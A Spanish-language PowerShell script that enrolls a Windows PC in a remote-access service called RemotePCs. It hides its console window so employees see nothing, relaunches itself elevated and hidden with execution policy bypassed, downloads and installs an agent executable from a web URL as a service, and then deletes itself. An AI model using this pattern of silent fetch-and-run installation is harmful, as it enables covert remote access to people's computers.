# RemotePCs - alta de esta PC
# Generado por el panel el 3/9/2026, 11:09:22.
# Sin etiqueta.
#
# OJO: el token es de UN SOLO USO y vence en 1 hora.
# Este archivo sirve para UNA sola PC. Para la siguiente, genera otro.

$ErrorActionPreference = 'Stop'
$Hub   = 'https://remotepcs.santij818.workers.dev'
$Token = '58c1711114f779b455de26d3904932d9fb9f5e164eafd144'
# Solo avisamos si algo falla; en exito no molestamos (se ve en el panel).
function Aviso($texto) { try { (New-Object -ComObject Wscript.Shell).Popup($texto, 12, 'RemotePCs', 16) | Out-Null } catch {} }

# Ocultamos la ventana de consola: los empleados no tienen que ver nada.
$hideSrc = @'
[DllImport("kernel32.dll")] public static extern System.IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(System.IntPtr h, int c);
'@
try {
    $win = Add-Type -MemberDefinition $hideSrc -Name RpcWin -Namespace Rpc -PassThru
    $null = $win::ShowWindow($win::GetConsoleWindow(), 0)
} catch {}

# Instalar un servicio de Windows exige ser Administrador. Si no lo somos, nos
# relanzamos elevados y OCULTOS con el mismo archivo, y salimos.
$identidad = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identidad)
$esAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $esAdmin) {
    $entrecomillado = '"' + $PSCommandPath + '"'
    Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-File',$entrecomillado
    exit
}

$agente = Join-Path $PSScriptRoot 'agent.exe'
$AgentUrl = 'https://eurolatamserv.github.io/agent.exe'
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $AgentUrl -OutFile $agente -UseBasicParsing
} catch {
    Aviso "No se pudo descargar el agente desde $AgentUrl"
    exit 1
}
& $agente install --hub $Hub --token $Token *> $null
$codigo = $LASTEXITCODE

if ($codigo -eq 0) {
    # Exito: el servicio ya corre desde la copia en %ProgramData%. Limpiamos
    # el agente descargado y este script, que lleva el token adentro.
    Remove-Item -LiteralPath $agente -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $PSCommandPath -Force -ErrorAction SilentlyContinue
} else {
    Aviso "No se pudo agregar esta PC (codigo $codigo)."
}
